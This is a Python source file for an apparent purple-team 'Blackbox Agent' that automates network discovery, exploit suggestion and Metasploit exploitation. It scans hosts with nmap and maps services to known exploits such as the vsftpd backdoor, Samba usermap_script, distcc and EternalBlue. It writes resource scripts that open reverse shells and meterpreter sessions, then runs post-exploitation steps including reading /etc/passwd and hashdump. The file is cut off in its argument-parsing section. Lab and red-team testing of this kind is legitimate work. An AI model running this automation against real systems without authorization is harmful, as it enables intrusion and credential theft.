#!/usr/bin/env python3
"""
Purple Team Platform - Blackbox Agent v2.2
Deployed on attacker machine (Kali Linux)
Communicates with the platform via SSH - executes modules on demand.

Usage:
    python3 "Blackbox Agent.py" network-discovery [--range CIDR] [--timing T1-T5]
    python3 "Blackbox Agent.py" scan-host <target_ip> [--timing T1-T5]
    python3 "Blackbox Agent.py" exploit <module> <target_ip> <target_port> <lhost> <lport>
    python3 "Blackbox Agent.py" status

All output is JSON to stdout for platform consumption.
"""

import nmap
import netifaces
import json
import subprocess
import time
import re
import logging
import ipaddress
import argparse
import sys
import os
from datetime import datetime, timezone
from typing import List, Dict
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

# Configure logging to stderr so stdout stays clean for JSON
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(f'/tmp/purple_agent_{datetime.now().strftime("%Y%m%d")}.log'),
        logging.StreamHandler(sys.stderr)
    ]
)
logger = logging.getLogger(__name__)


# =============================================================================
# OUTPUT HELPERS
# =============================================================================

def output_json(data: dict):
    """Print JSON result to stdout for platform to capture"""
    print(json.dumps(data, indent=2, default=str))
    sys.stdout.flush()


def output_error(message: str, details: str = None):
    """Print error as JSON to stdout"""
    output_json({
        'success': False,
        'error': message,
        'details': details,
        'timestamp': datetime.now(timezone.utc).isoformat()
    })


# =============================================================================
# SEARCHSPLOIT INTEGRATION
# =============================================================================

def run_searchsploit(search_term: str, max_results: int = 8) -> List[Dict]:
    """Search local exploit-db via searchsploit. Returns list of matches. OPTIMIZED: faster timeout."""
    if not search_term or len(search_term.strip()) < 2:
        return []
    try:
        # OPTIMIZED: Reduced timeout from 15s to 5s for faster discovery
        result = subprocess.run(
            ['searchsploit', '--json', '--disable-colour', search_term.strip()],
            capture_output=True, text=True, timeout=5
        )
        if result.returncode == 0 and result.stdout.strip():
            data = json.loads(result.stdout)
            exploits = []
            for entry in data.get('RESULTS_EXPLOIT', [])[:max_results]:
                edb_id = str(entry.get('EDB-ID', ''))
                title = entry.get('Title', '')
                path = entry.get('Path', '')
                # Try to detect if it's a Metasploit module
                is_msf = 'metasploit' in path.lower() or '/exploits/' in path.lower()
                exploits.append({
                    'edb_id': edb_id,
                    'title': title,
                    'path': path,
                    'date': entry.get('Date_Published', ''),
                    'type': entry.get('Type', ''),
                    'platform': entry.get('Platform', ''),
                    'is_metasploit': is_msf,
                })
            return exploits
    except FileNotFoundError:
        logger.debug("searchsploit not installed")
    except subprocess.TimeoutExpired:
        logger.debug(f"searchsploit timed out for: {search_term}")
    except (json.JSONDecodeError, Exception) as e:
        logger.debug(f"searchsploit error: {e}")
    return []


# =============================================================================
# EXPLOIT DATABASE
# =============================================================================

class ExploitDatabase:
    """Database of known working exploits for specific targets"""

    def __init__(self):
        self.metasploitable2_exploits = {
            'vsftpd': {
                'module': 'exploit/unix/ftp/vsftpd_234_backdoor',
                'options': {},
                'payload': 'cmd/unix/interact',
                'description': 'vsftpd 2.3.4 backdoor (connects to port 6200)',
                'rank': 'excellent',
                'port': 21,
                'exploit_type': 'backdoor'
            },
            'samba': {
                'module': 'exploit/multi/samba/usermap_script',
                'options': {},
                'payload': 'cmd/unix/reverse_netcat',
                'description': 'Samba username map script',
                'rank': 'excellent',
                'port': 139,
                'exploit_type': 'command_shell'
            },
            'postgresql': {
                'module': 'exploit/linux/postgres/postgres_payload',
                'options': {'DATABASE': 'template1', 'USERNAME': 'postgres', 'PASSWORD': 'postgres'},
                'payload': 'linux/x86/meterpreter/reverse_tcp',
                'description': 'PostgreSQL payload execution',
                'rank': 'excellent',
                'port': 5432,
                'exploit_type': 'meterpreter'
            },
            'distcc': {
                'module': 'exploit/unix/misc/distcc_exec',
                'options': {},
                'payload': 'cmd/unix/reverse_netcat',
                'description': 'DistCC daemon command execution',
                'rank': 'excellent',
                'port': 3632,
                'exploit_type': 'command_shell'
            },
            'unrealirc': {
                'module': 'exploit/unix/irc/unreal_ircd_3281_backdoor',
                'options': {},
                'payload': 'cmd/unix/reverse_netcat',
                'description': 'UnrealIRCd 3.2.8.1 Backdoor',
                'rank': 'excellent',
                'port': 6667,
                'exploit_type': 'command_shell'
            },
            'java_rmi': {
                'module': 'exploit/multi/misc/java_rmi_server',
                'options': {},
                'payload': 'java/meterpreter/reverse_tcp',
                'description': 'Java RMI Server Insecure Default Configuration',
                'rank': 'excellent',
                'port': 1099,
                'exploit_type': 'meterpreter'
            },
            'tomcat': {
                'module': 'exploit/multi/http/tomcat_mgr_upload',
                'options': {'HttpUsername': 'tomcat', 'HttpPassword': 'tomcat'},
                'payload': 'java/meterpreter/reverse_tcp',
                'description': 'Tomcat Manager Authenticated Upload Code Execution',
                'rank': 'excellent',
                'port': 8080,
                'exploit_type': 'meterpreter'
            },
            'ingreslock': {
                'module': 'exploit/unix/misc/distcc_exec',
                'options': {},
                'payload': 'cmd/unix/reverse_netcat',
                'description': 'Ingreslock backdoor (port 1524)',
                'rank': 'excellent',
                'port': 1524,
                'exploit_type': 'command_shell'
            }
        }

        self.windows_exploits = {
            'EternalBlue': {
                'module': 'exploit/windows/smb/ms17_010_eternalblue',
                'options': {},
                'payload': None,
                'description': 'EternalBlue SMB Remote Kernel Pool Corruption (MS17-010)',
                'rank': 'average',
                'port': 445,
                'exploit_type': 'meterpreter'
            },
            'SMB2 Negotiate': {
                'module': 'exploit/windows/smb/ms09_050_smb2_negotiate_func_index',
                'options': {},
                'payload': None,
                'description': 'MS09-050 SMB2 Negotiate Remote Code Execution',
                'rank': 'good',
                'port': 445,
                'exploit_type': 'meterpreter'
            },
            'MS08-067': {
                'module': 'exploit/windows/smb/ms08_067_netapi',
                'options': {},
                'payload': None,
                'description': 'MS08-067 Microsoft Server Service NetPathCanonicalize()',
                'rank': 'great',
                'port': 445,
                'exploit_type': 'meterpreter'
            }
        }

    def get_exploits_for_service(self, service: str, version: str, os_type: str) -> List[Dict]:
        """Get targeted exploits based on service, version, and OS"""
        exploits = []
        search_string = f"{service} {version}".lower()

        if os_type == 'windows':
            for name, exploit_info in self.windows_exploits.items():
                if any(x in service.lower() for x in ['smb', 'microsoft-ds', 'netbios']):
                    exploits.append({
                        'name': exploit_info['module'],
                        'options': exploit_info['options'],
                        'payload': exploit_info['payload'],
                        'description': exploit_info['description'],
                        'rank': exploit_info['rank'],
                        'port': exploit_info.get('port', 445),
                        'exploit_type': exploit_info.get('exploit_type', 'unknown')
                    })
        elif os_type == 'linux':
            for key, exploit_info in self.metasploitable2_exploits.items():
                key_lower = key.lower()
                if key_lower in search_string or key_lower in service.lower():
                    exploits.append({
                        'name': exploit_info['module'],
                        'options': exploit_info['options'],
                        'payload': exploit_info['payload'],
                        'description': exploit_info['description'],
                        'rank': exploit_info['rank'],
                        'port': exploit_info.get('port', 0),
                        'exploit_type': exploit_info.get('exploit_type', 'unknown')
                    })

        return exploits


# =============================================================================
# NETWORK DISCOVERY MODULE
# =============================================================================

class NetworkDiscovery:
    """Network discovery module - finds live hosts, identifies OS, enumerates services"""

    def __init__(self, timing: str = 'T4'):
        self.nm = nmap.PortScanner()
        self.local_ip = None
        self.network_range = None
        self.gateway = None
        self.interface = None
        # Validate timing template
        valid_timings = ['T0', 'T1', 'T2', 'T3', 'T4', 'T5']
        self.timing = timing if timing in valid_timings else 'T4'
        self.exploit_db = ExploitDatabase()

    def get_local_network_info(self) -> Dict:
        """Detect local network configuration automatically"""
        try:
            gateways = netifaces.gateways()
            default_gateway = gateways['default'][netifaces.AF_INET]
            self.gateway = default_gateway[0]
            self.interface = default_gateway[1]

            addrs = netifaces.ifaddresses(self.interface)
            ipv4_info = addrs[netifaces.AF_INET][0]

            self.local_ip = ipv4_info['addr']
            netmask = ipv4_info['netmask']

            network = ipaddress.IPv4Network(f"{self.local_ip}/{netmask}", strict=False)
            self.network_range = str(network)

            return {
                'local_ip': self.local_ip,
                'gateway': self.gateway,
                'network_range': self.network_range,
                'interface': self.interface,
                'netmask': netmask
            }
        except Exception as e:
            logger.error(f"Network info detection failed: {e}")
            raise

    def should_skip_ip(self, ip: str) -> bool:
        """Check if IP should be skipped (local, gateway, broadcast)"""
        if ip == self.local_ip:
            return True
        if ip == self.gateway:
            return True
        try:
            last_octet = int(ip.split('.')[-1])
            if last_octet in [0, 255]:
                return True
        except (ValueError, IndexError):
            # Invalid IP format, skip it
            return True
        return False

    def discover_hosts(self, network_range: str = None) -> List[Dict]:
        """Phase 1: Discover live hosts using ping sweep (optimized for speed)"""
        scan_range = network_range or self.network_range
        if not scan_range:
            raise ValueError("No network range. Run get_local_network_info() or provide --range")

        logger.info(f"[*] Ping sweep: {scan_range} (timing: -{self.timing})")

        try:
            # OPTIMIZED: Increased parallelism and added timeout to prevent hanging
            # --min-parallelism 50: scan more hosts in parallel
            # --max-parallelism 100: maximum concurrent scans
            # --host-timeout 30s: timeout per host to prevent hanging on unresponsive hosts
            self.nm.scan(hosts=scan_range, arguments=f'-sn -{self.timing} --min-parallelism 50 --max-parallelism 100 --host-timeout 30s')

            live_hosts = []
            for host in self.nm.all_hosts():
                if self.nm[host].state() == 'up':
                    if not self.should_skip_ip(host):
                        host_entry = {
                            'ip': host,
                            'state': 'up',
                            'hostnames': [],
                            'mac_address': None,
                            'vendor': None
                        }
                        if 'hostnames' in self.nm[host]:
                            for hn in self.nm[host]['hostnames']:
                                if hn.get('name'):
                                    host_entry['hostnames'].append(hn['name'])
                        if 'addresses' in self.nm[host]:
                            host_entry['mac_address'] = self.nm[host]['addresses'].get('mac')
                        if 'vendor' in self.nm[host] and self.nm[host]['vendor']:
                            host_entry['vendor'] = list(self.nm[host]['vendor'].values())[0] if self.nm[host]['vendor'] else None

                        live_hosts.append(host_entry)
                        logger.info(f"[+] Live: {host}")

            logger.info(f"[+] Found {len(live_hosts)} live host(s)")
            return live_hosts
        except Exception as e:
            logger.error(f"Host discovery failed: {e}")
            raise

    def scan_host_details(self, host: str) -> Dict:
        """Phase 2: Detailed port scan + OS detection + NSE scripts (optimized for speed)"""
        logger.info(f"[*] Detailed scan: {host} (timing: -{self.timing})")

        host_info = {
            'ip': host,
            'os': 'Unknown',
            'os_type': 'unknown',
            'os_accuracy': 0,
            'os_matches': [],
            'ports': [],
            'suggested_exploits': [],
            'scan_time': None,
            'timestamp': datetime.now(timezone.utc).isoformat()
        }

        try:
            start_time = time.time()
            # OPTIMIZED: Scan only the most common ports (faster and more focused)
            # Most common ports: FTP, SSH, Telnet, SMTP, DNS, HTTP, POP3, IMAP, HTTPS, SMB, 
            #                    MySQL, RDP, PostgreSQL, VNC, HTTP-alt, and other common services
            common_ports = '21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1433,1723,3306,3389,5432,5900,8080,8443,8888,9000,10000'
            # -sV: version detection, -O: OS detection, -sC: default NSE scripts
            # --version-intensity 3: faster version detection
            # --max-retries 1: reduce retries for speed
            # --host-timeout 5m: timeout per host to prevent hanging
            scan_args = f'-sV -O -sC -Pn -{self.timing} --version-intensity 3 --max-retries 1 --host-timeout 5m -p {common_ports}'
            self.nm.scan(host, arguments=scan_args)
            host_info['scan_time'] = round(time.time() - start_time, 2)

            if host in self.nm.all_hosts():
                # OS Detection
                if 'osmatch' in self.nm[host] and self.nm[host]['osmatch']:
                    best_match = self.nm[host]['osmatch'][0]
                    host_info['os'] = best_match['name']
                    host_info['os_accuracy'] = int(best_match.get('accuracy', 0))

                    for match in self.nm[host]['osmatch'][:3]:
                        host_info['os_matches'].append({
                            'name': match['name'],
                            'accuracy': int(match.get('accuracy', 0))
                        })

                    os_lower = best_match['name'].lower()
                    if 'linux' in os_lower:
                        host_info['os_type'] = 'linux'
                    elif 'windows' in os_lower:
                        host_info['os_type'] = 'windows'
                    elif 'freebsd' in os_lower or 'openbsd' in os_lower:
                        host_info['os_type'] = 'bsd'

                    logger.info(f"[+] OS: {best_match['name']} ({host_info['os_accuracy']}%)")

                # Port enumeration
                for proto in self.nm[host].all_protocols():
                    for port in sorted(self.nm[host][proto].keys()):
                        port_data = self.nm[host][proto][port]
                        if port_data['state'] == 'open':
                            service_info = {
                                'port': port,
                                'protocol': proto,
                                'state': port_data['state'],
                                'service': port_data.get('name', 'unknown'),
                                'product': port_data.get('product', ''),
                                'version': port_data.get('version', ''),
                                'extrainfo': port_data.get('extrainfo', ''),
                                'cpe': port_data.get('cpe', ''),
                                'scripts': {}
                            }
                            if 'script' in port_data:
                                service_info['scripts'] = dict(port_data['script'])

                            host_info['ports'].append(service_info)

                            version_str = f"{service_info['product']} {service_info['version']}".strip()
                            if not version_str:
                                version_str = service_info['service']
                            logger.info(f"[+] Port {port}/{proto}: {version_str}")

                # === PHASE 3: Suggest exploits for this host ===
                host_info['suggested_exploits'] = self._suggest_exploits(host_info)

            return host_info
        except Exception as e:
            logger.error(f"Detailed scan failed for {host}: {e}")
            host_info['error'] = str(e)
            return host_info

    def _suggest_exploits(self, host_info: Dict) -> List[Dict]:
        """Suggest exploits from built-in DB + searchsploit for discovered services"""
        suggestions = []
        seen_ids = set()
        os_type = host_info.get('os_type', 'unknown')

        for port_info in host_info.get('ports', []):
            service = port_info['service']
            product = port_info.get('product', '')
            version = port_info.get('version', '')
            port = port_info['port']
            version_string = f"{product} {version}".strip()

            # ── 1. Built-in exploit database (high confidence) ──
            db_exploits = self.exploit_db.get_exploits_for_service(service, version_string, os_type)
            for exploit in db_exploits:
                eid = f"builtin-{exploit['name'].replace('/', '-')}-{port}"
                if eid not in seen_ids:
                    seen_ids.add(eid)
                    suggestions.append({
                        'id': eid,
                        'name': exploit['description'],
                        'module_path': exploit['name'],
                        'source': 'built-in',
                        'service': service,
                        'port': port,
                        'product': version_string or service,
                        'description': exploit['description'],
                        'rank': exploit.get('rank', 'normal'),
                        'payload': exploit.get('payload'),
                        'exploit_type': exploit.get('exploit_type', 'unknown'),
                        'options': exploit.get('options', {}),
                        'confidence': 'high'
                    })
                    logger.info(f"[SUGGEST] Built-in: {exploit['name']} → :{port}")

            # ── 2. NSE script vulnerability hints ──
            scripts = port_info.get('scripts', {})
            for script_name, script_output in scripts.items():
                if any(kw in script_name.lower() for kw in ['vuln', 'exploit', 'backdoor']):
                    eid = f"nse-{script_name}-{port}"
                    if eid not in seen_ids:
                        seen_ids.add(eid)
                        # Check if VULNERABLE appears in output
                        is_vuln = 'VULNERABLE' in script_output.upper() or 'vulnerable' in script_output.lower()
                        if is_vuln:
                            suggestions.append({
                                'id': eid,
                                'name': f"NSE: {script_name}",
                                'module_path': '',
                                'source': 'nmap-scripts',
                                'service': service,
                                'port': port,
                                'product': version_string or service,
                                'description': script_output[:200],
                                'rank': 'unknown',
                                'payload': None,
                                'exploit_type': 'unknown',
                                'options': {},
                                'confidence': 'high'
                            })
                            logger.info(f"[SUGGEST] NSE vuln: {script_name} → :{port}")

            # ── 3. searchsploit (medium confidence) - OPTIMIZED: limit calls and timeout ──
            # Only search if we have a meaningful product name and haven't found built-in exploits
            if len(suggestions) == 0 and product and product.lower() not in ('unknown', '', 'tcp', 'udp'):
                search_terms = []
                if product and version:
                    search_terms.append(f"{product} {version}")
                if product and product.lower() not in ('unknown', ''):
                    search_terms.append(product)

                # Limit to first search term only to save time
                for term in search_terms[:1]:
                    ssploit_results = run_searchsploit(term, max_results=3)  # Reduced from 5 to 3
                    for sr in ssploit_results:
                        eid = f"edb-{sr['edb_id']}"
                        if eid not in seen_ids:
                            seen_ids.add(eid)
                            suggestions.append({
                                'id': eid,
                                'name': sr['title'],
                                'module_path': f"EDB-{sr['edb_id']}",
                                'source': 'searchsploit',
                                'service': service,
                                'port': port,
                                'product': version_string or service,
                                'description': sr['title'],
                                'rank': 'unknown',
                                'payload': None,
                                'exploit_type': sr.get('type', 'unknown'),
                                'options': {},
                                'confidence': 'medium' if sr.get('is_metasploit') else 'low'
                            })
                    logger.info(f"[SUGGEST] searchsploit '{term}': {len(ssploit_results)} result(s)")

        # Sort: high confidence first, then medium, then low
        confidence_order = {'high': 0, 'medium': 1, 'low': 2}
        suggestions.sort(key=lambda x: confidence_order.get(x.get('confidence', 'low'), 3))

        logger.info(f"[SUGGEST] Total {len(suggestions)} exploit suggestion(s) for {host_info['ip']}")
        return suggestions

    def run_full_discovery(self, network_range: str = None) -> Dict:
        """Run complete network discovery: detect network → find hosts → scan each host → suggest exploits"""
        result = {
            'success': True,
            'module': 'network_discovery',
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'agent_info': {
                'hostname': os.uname().nodename if hasattr(os, 'uname') else 'unknown',
                'agent_version': '2.2.0'
            },
            'scan_config': {
                'timing': self.timing,
            },
            'network_info': {},
            'discovered_hosts': [],
            'summary': {}
        }

        try:
            # Validate network range if provided
            if network_range:
                try:
                    ipaddress.IPv4Network(network_range, strict=False)
                except ValueError as e:
                    result['success'] = False
                    result['error'] = f'Invalid network range: {network_range} - {str(e)}'
                    return result
            # Step 1: Detect local network
            logger.info("=" * 60)
            logger.info(f"[PHASE 1] Detecting local network (timing: -{self.timing})...")
            logger.info("=" * 60)
            net_info = self.get_local_network_info()
            result['network_info'] = net_info

            scan_range = network_range or self.network_range

            # Step 2: Host discovery
            logger.info("=" * 60)
            logger.info("[PHASE 2] Discovering live hosts...")
            logger.info("=" * 60)
            live_hosts = self.discover_hosts(scan_range)

            # Step 3: Detailed scan + exploit suggestion per host (OPTIMIZED: parallel scanning)
            logger.info("=" * 60)
            logger.info(f"[PHASE 3] Scanning {len(live_hosts)} host(s) + suggesting exploits (parallel mode)...")
            logger.info("=" * 60)

            # OPTIMIZED: Use ThreadPoolExecutor for parallel host scanning
            # Limit to 3 concurrent scans to avoid overwhelming the network/agent
            max_workers = min(3, len(live_hosts))
            results_lock = Lock()
            
            def scan_single_host(host_entry):
                """Scan a single host and return detailed info"""
                ip = host_entry['ip']
                try:
                    logger.info(f"[*] Scanning: {ip}")
                    detailed = self.scan_host_details(ip)
                    
                    # Merge discovery info
                    detailed['hostnames'] = host_entry.get('hostnames', [])
                    detailed['mac_address'] = host_entry.get('mac_address')
                    detailed['vendor'] = host_entry.get('vendor')
                    
                    logger.info(f"[+] Completed: {ip} ({len(detailed.get('ports', []))} ports)")
                    return detailed
                except Exception as e:
                    logger.error(f"[!] Scan failed for {ip}: {e}")
                    return {
                        'ip': ip,
                        'error': str(e),
                        'ports': [],
                        'suggested_exploits': [],
                        'hostnames': host_entry.get('hostnames', []),
                        'mac_address': host_entry.get('mac_address'),
                        'vendor': host_entry.get('vendor'),
                    }

            # Execute scans in parallel
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                future_to_host = {executor.submit(scan_single_host, host_entry): host_entry for host_entry in live_hosts}
                
                for future in as_completed(future_to_host):
                    try:
                        detailed = future.result()
                        with results_lock:
                            result['discovered_hosts'].append(detailed)
                    except Exception as e:
                        host_entry = future_to_host[future]
                        logger.error(f"[!] Exception scanning {host_entry['ip']}: {e}")
                        with results_lock:
                            result['discovered_hosts'].append({
                                'ip': host_entry['ip'],
                                'error': str(e),
                                'ports': [],
                                'suggested_exploits': [],
                            })

            # Summary
            total_ports = sum(len(h['ports']) for h in result['discovered_hosts'])
            total_exploits = sum(len(h.get('suggested_exploits', [])) for h in result['discovered_hosts'])
            os_types = {}
            for h in result['discovered_hosts']:
                ot = h.get('os_type', 'unknown')
                os_types[ot] = os_types.get(ot, 0) + 1

            result['summary'] = {
                'total_hosts': len(result['discovered_hosts']),
                'total_open_ports': total_ports,
                'total_suggested_exploits': total_exploits,
                'os_distribution': os_types,
                'scan_completed_at': datetime.now(timezone.utc).isoformat()
            }

            logger.info(f"\n[+] Discovery complete: {len(result['discovered_hosts'])} hosts, "
                        f"{total_ports} ports, {total_exploits} exploit suggestions")

        except Exception as e:
            logger.error(f"Network discovery failed: {e}")
            result['success'] = False
            result['error'] = str(e)

        return result


# =============================================================================
# HOST SCAN MODULE
# =============================================================================

def run_host_scan(target_ip: str, timing: str = 'T4') -> Dict:
    """Run detailed scan on a single host"""
    # Validate IP address
    try:
        ipaddress.IPv4Address(target_ip)
    except ValueError:
        return {
            'success': False,
            'module': 'host_scan',
            'error': f'Invalid IP address: {target_ip}',
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'target': target_ip,
            'host_info': {}
        }
    
    discovery = NetworkDiscovery(timing=timing)
    try:
        discovery.get_local_network_info()
    except Exception as e:
        logger.debug(f"Could not detect local network info: {e}")

    result = {
        'success': True,
        'module': 'host_scan',
        'timestamp': datetime.now(timezone.utc).isoformat(),
        'target': target_ip,
        'host_info': discovery.scan_host_details(target_ip)
    }
    return result


# =============================================================================
# EXPLOIT EXECUTION MODULE
# =============================================================================

class ExploitRunner:
    """Execute targeted exploits via Metasploit"""

    def __init__(self, local_ip: str):
        self.local_ip = local_ip
        self.exploit_db = ExploitDatabase()

    def run_exploit(self, exploit_module: str, target_ip: str, target_port: int,
                    lhost: str, lport: int, payload: str = None,
                    options: Dict = None, os_type: str = 'linux',
                    exploit_type: str = 'command_shell') -> Dict:
        """Execute a single exploit with post-exploitation"""
        
        # Validate inputs
        if not exploit_module or not exploit_module.strip():
            return {
                'success': False,
                'error': 'exploit_module is required',
                'timestamp': datetime.now(timezone.utc).isoformat()
            }
        
        if not target_ip or not target_ip.strip():
            return {
                'success': False,
                'error': 'target_ip is required',
                'timestamp': datetime.now(timezone.utc).isoformat()
            }
        
        if not (1 <= target_port <= 65535):
            return {
                'success': False,
                'error': f'invalid target_port: {target_port} (must be 1-65535)',
                'timestamp': datetime.now(timezone.utc).isoformat()
            }
        
        if not lhost or not lhost.strip():
            return {
                'success': False,
                'error': 'lhost is required',
                'timestamp': datetime.now(timezone.utc).isoformat()
            }
        
        if not (1 <= lport <= 65535):
            return {
                'success': False,
                'error': f'invalid lport: {lport} (must be 1-65535)',
                'timestamp': datetime.now(timezone.utc).isoformat()
            }

        result = {
            'success': False,
            'module': 'exploit',
            'exploit_module': exploit_module,
            'target_ip': target_ip,
            'target_port': target_port,
            'lhost': lhost,
            'lport': lport,
            'payload': payload,
            'session_id': None,
            'output': '',
            'commands_executed': [],
            'dumped_data': None,
            'timestamp': datetime.now(timezone.utc).isoformat()
        }

        rc_file = f"/tmp/exploit_{int(time.time())}_{target_port}.rc"
        output_file = f"/tmp/exploit_output_{int(time.time())}_{target_port}.txt"

        try:
            commands = []

            with open(rc_file, 'w') as f:
                cmd = f"use {exploit_module}"
                f.write(cmd + "\n"); commands.append(cmd)

                f.write(f"set RHOSTS {target_ip}\n"); commands.append(f"set RHOSTS {target_ip}")
                f.write(f"set RHOST {target_ip}\n")
                f.write(f"set RPORT {target_port}\n"); commands.append(f"set RPORT {target_port}")
                f.write(f"set LHOST {lhost}\n"); commands.append(f"set LHOST {lhost}")
                f.write(f"set LPORT {lport}\n"); commands.append(f"set LPORT {lport}")

                if payload:
                    f.write(f"set PAYLOAD {payload}\n"); commands.append(f"set PAYLOAD {payload}")

                if 'usermap_script' in exploit_module:
                    f.write("set SMB::AlwaysEncrypt false\n")
                    f.write("set SMB::ProtocolVersion 1\n")
                if 'postgres' in exploit_module:
                    f.write("set DATABASE template1\n")
                    f.write("set USERNAME postgres\n")
                    f.write("set PASSWORD postgres\n")
                if 'ms17_010' in exploit_module or 'eternalblue' in exploit_module.lower():
                    f.write("set TARGET 0\n")

                if options:
                    for key, value in options.items():
                        f.write(f"set {key} {value}\n")
                        commands.append(f"set {key} {value}")

                f.write("show options\n")
                f.write("exploit -j -z\n"); commands.append("exploit -j -z")
                f.write("sleep 5\n")  # Reduced from 20s to 5s - enough time for exploit to initialize
                f.write("sessions -l\n")

                # Post-exploitation
                f.write("\n# === POST-EXPLOITATION ===\n")
                if exploit_type == 'meterpreter':
                    if os_type == 'linux':
                        f.write("sessions -i 1\nsleep 2\n")
                        f.write("getuid\nsleep 1\n")
                        f.write("sysinfo\nsleep 1\n")
                        f.write("shell\nsleep 2\n")
                        f.write("id\nsleep 1\n")
                        f.write("cat /etc/passwd\nsleep 2\n")
                        f.write("uname -a\nsleep 1\n")
                        f.write("hostname\nsleep 1\n")
                        f.write("exit\nsleep 1\n")
                        f.write("background\n")
                    elif os_type == 'windows':
                        f.write("sessions -i 1\nsleep 2\n")
                        f.write("getuid\nsleep 1\n")
                        f.write("sysinfo\nsleep 2\n")
                        f.write("hostname\nsleep 1\n")
                        f.write("hashdump\nsleep 2\n")
                        f.write("background\n")
                elif exploit_type in ('command_shell', 'backdoor'):
                    if os_type == 'linux':
                        f.write("sessions -i 1\nsleep 2\n")
                        f.write("shell\nsleep 1\n")
                        f.write("id\nsleep 1\n")
                        f.write("cat /etc/passwd\nsleep 2\n")
                        f.write("uname -a\nsleep 1\n")
                        f.write("hostname\nsleep 1\n")
                        f.write("exit\nsleep 1\n")
                        f.write("background\n")
                    elif os_type == 'windows':
                        f.write("sessions -i 1\nsleep 2\n")
                        f.write("shell\nsleep 1\n")
                        f.write("whoami\nsleep 1\n")
                        f.write("hostname\nsleep 1\n")
                        f.write("ipconfig\nsleep 2\n")
                        f.write("exit\nsleep 1\n")
                        f.write("background\n")

                f.write("\n# === CLEANUP ===\n")
                f.write("sessions -l\nsessions -K\nsleep 2\nexit -y\n")

            result['commands_executed'] = commands

            cmd = f"msfconsole -q -r {rc_file} -o {output_file}"
            logger.info(f"[*] Executing: {exploit_module} → {target_ip}:{target_port}")
            try:
                # Reduced timeout from 300s (5 min) to 180s (3 min) for faster execution
                subprocess.run(cmd, shell=True, timeout=180, capture_output=True, check=False)
            except subprocess.TimeoutExpired:
                logger.error(f"[!] Exploit execution timed out after 180s")
                result['error'] = 'Exploit execution timed out (180s)'
                # Clean up files even on timeout
                if os.path.exists(output_file):
                    try:
                        with open(output_file, 'r') as f:
                            result['output'] = f.read()
                    except:
                        pass
                if os.path.exists(rc_file):
                    os.remove(rc_file)
                if os.path.exists(output_file):
                    os.remove(output_file)
                return result

            if os.path.exists(output_file):
                with open(output_file, 'r') as f:
                    output = f.read()
                result['output'] = output

                # Enhanced session detection patterns
                session_patterns = [
                    r'Meterpreter session (\d+) opened',
                    r'Command shell session (\d+) opened', 
                    r'Session (\d+) opened',
                    r'Session (\d+) created'
                ]
                
                for pattern in session_patterns:
                    matches = re.finditer(pattern, output, re.IGNORECASE)
                    for match in matches:
                        result['session_id'] = match.group(1)
                        result['success'] = True
                        logger.info(f"[+] Session detected: {result['session_id']}")
                        break
                    if result['session_id']:
                        break

                # Additional session detection methods
                if not result['session_id']:
                    # Check for sessions table format
                    session_table_match = re.search(r'Active sessions[\s\S]*?(\d+)\s+\S*\s+(\S+)\s+(\S+)', output)
                    if session_table_match and 'No active sessions' not in output:
                        result['session_id'] = session_table_match.group(1)
                        result['success'] = True
                        logger.info(f"[+] Session found in table: {result['session_id']}")
                    
                    # Check for shell indicators
                    elif any(indicator in output for indicator in ['uid=', 'root@', 'C:\\', 'Server service:', 'shell>']):
                        result['session_id'] = '1'
                        result['success'] = True
                        logger.info("[+] Shell session detected (indicators found)")
                    
                    # Check for successful exploitation messages
                    elif any(success_msg in output for success_msg in ['Exploit completed', 'Exploit successful', 'Payload executed']):
                        result['session_id'] = '1'
                        result['success'] = True
                        logger.info("[+] Exploit successful, assuming session 1")

                if result['success'] and os_type == 'linux':
                    passwd_lines = [l for l in output.split('\n')
                                    if re.match(r'^[a-zA-Z0-9_-]+:[x*]:[\d]+:[\d]+:', l)]
                    if passwd_lines:
                        result['dumped_data'] = {'type': 'etc_passwd', 'entries': passwd_lines, 'count': len(passwd_lines)}

                try:
                    os.remove(output_file)
                except:
                    pass
            if os.path.exists(rc_file):
                try:
                    os.remove(rc_file)
                except:
                    pass

        except Exception as e:
            logger.error(f"[!] Exploit execution error: {e}")
            result['error'] = str(e)
            # Clean up files on error
            if os.path.exists(output_file):
                try:
                    os.remove(output_file)
                except:
                    pass
            if os.path.exists(rc_file):
                try:
                    os.remove(rc_file)
                except:
                    pass

        return result


# =============================================================================
# STATUS MODULE
# =============================================================================

def get_agent_status() -> Dict:
    """Return agent status and capabilities"""
    status = {
        'success': True,
        'module': 'status',
        'agent_version': '2.2.0',
        'platform': 'Purple Team Ops',
        'timestamp': datetime.now(timezone.utc).isoformat(),
        'system': {},
        'capabilities': ['network-discovery', 'scan-host', 'exploit', 'status'],
        'tools': {}
    }

    try:
        import platform as pf
        status['system'] = {
            'hostname': pf.node(),
            'os': pf.system(),
            'os_release': pf.release(),
            'arch': pf.machine(),
            'python_version': pf.python_version()
        }
    except:
        pass

    tools = {
        'nmap': 'nmap --version',
        'msfconsole': 'msfconsole --version',
        'searchsploit': 'searchsploit --version 2>&1 | head -1',
        'python3': 'python3 --version'
    }
    for tool, cmd in tools.items():
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
            version_line = (result.stdout or result.stderr).strip().split('\n')[0]
            status['tools'][tool] = {
                'available': result.returncode == 0,
                'version': version_line if version_line else None
            }
        except subprocess.TimeoutExpired:
            status['tools'][tool] = {'available': False, 'version': 'Timeout checking version'}
        except Exception as e:
            logger.debug(f"Tool check failed for {tool}: {e}")
            status['tools'][tool] = {'available': False, 'version': None}

    return status


# =============================================================================
# CLI ENTRY POINT
# =============================================================================

def main():
    parser = argparse.ArgumentParser(
        description='Purple Team Platform - Blackbox Agent v2.2',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Commands:
  network-discovery    Discover hosts + OS + services + suggest exploits
  scan-host           Detailed scan of a single host
  exploit             Execute a specific exploit module
  status              Show agent status

Timing Templates:
  T1  Sneaky   (IDS evasion, very slow)
  T2  Polite   (slow, reduced bandwidth)
  T3  Normal   (default nmap speed)
  T4  Aggressive (fast, recommended for labs)
  T5  Insane   (maximum speed, may miss results)
        """
    )

    subparsers = parser.add_subparsers(dest='command', help='Command to execute')

